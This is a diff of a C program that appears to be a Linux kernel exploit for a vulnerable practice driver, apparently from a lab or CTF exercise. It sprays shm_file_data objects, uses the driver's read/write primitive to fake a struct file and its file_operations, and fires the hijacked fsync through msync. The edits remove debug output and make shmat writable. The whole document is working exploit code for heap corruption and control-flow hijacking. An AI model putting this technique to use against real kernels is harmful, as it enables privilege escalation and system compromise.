@@ -4,21 +4,15 @@
 #include <unistd.h>
 #include <sys/ioctl.h>
 #include <errno.h>
-#include <time.h>
 #include <sys/mman.h>
 #include <sys/types.h>
 #include <sys/shm.h>
 #include <sys/ipc.h>
-#include <string.h>
 
 #include "../heap.h"
 #include "sof.h"
 
-#define MAX_ADDRESSES 1024
-
 int fd;
-unsigned long allocated_addresses[MAX_ADDRESSES] = {0};
-unsigned int current_max = 0;
 
 unsigned long user_cs, user_ss, user_sp, user_rflags;
 
@@ -129,7 +123,7 @@ void driver_read_write(void* to, void* from, size_t size){
 
 void *create_shm_file_data(int id){
 	void * ret;
-	ret = shmat(id, NULL, SHM_RDONLY);
+	ret = shmat(id, NULL, 0);
 	if((long)ret == -1){
 		printf("[-] Failed to allocate shm_file_struct\n");
 		perror("shmat");
@@ -141,27 +135,25 @@ void *create_shm_file_data(int id){
 int get_shm_id(){
 	int ret;
 
-	printf("[+] Getting shmid...\n");
-
 	ret = shmget(IPC_PRIVATE, 0x1000, SHM_R|SHM_W);
 	if(ret == -1){
 		printf("[-] Failed to get shmid\n");
 		perror("shmget");
 		exit(-1);
 	}
-	printf("[+] Received shmid: %d\n", ret);
 	return ret;
 }
 
 int main(){
-	int ret, shmid, fd2;
+	int ret, shmid;
 	struct iomalloc *iom;
 	unsigned long target[8] = {0};
 	unsigned long payload[4] = {0};
 	unsigned int off = 4;
+
 	struct file s_file;
 	struct file_operations f_ops;
-	struct shm_file_data sfd;
+
 	void *address;
 
 	save_state();
@@ -190,7 +182,7 @@ int main(){
 	iom->size = 32;
 	iom->addr = NULL;
 
-
+	printf("[+] Allocating many shm_file_data structs...\n");
 	for(int i=0; i<10; i++){
 		shmid = get_shm_id();
 		create_shm_file_data(shmid);
@@ -204,7 +196,6 @@ int main(){
 	driver_alloc(iom);
 	address = create_shm_file_data(shmid);
 	driver_read_write(iom->addr, payload, 32);
-	printf("%p\n", iom->addr);
 	driver_read_write(target, iom->addr, 8 * sizeof(unsigned long));
 
 	if((int)target[4] != shmid){
@@ -219,21 +210,18 @@ int main(){
 	printf("[+] Sending payload...\n");
 	driver_read_write(iom->addr, target, 8 * sizeof(unsigned long));
 
-	printf("sync: %p\n", s_file.f_op->fsync);
-
 	printf("[+] Triggering exploit...\n");
 	ret = msync(address, 0x1000, MS_SYNC);
 	if(ret != 0){
 		perror("msync");
 	}
 
-	printf("[+] Triggered...\n");
-	printf("address of file struct: %p\n", &s_file);
+	printf("[-] Not supposed to be here :(\n");
 
 	driver_free((unsigned long)iom->addr);
+	exit(-1);
 
 
-	close(fd2);
 	close(fd);
 	free(iom);
 }
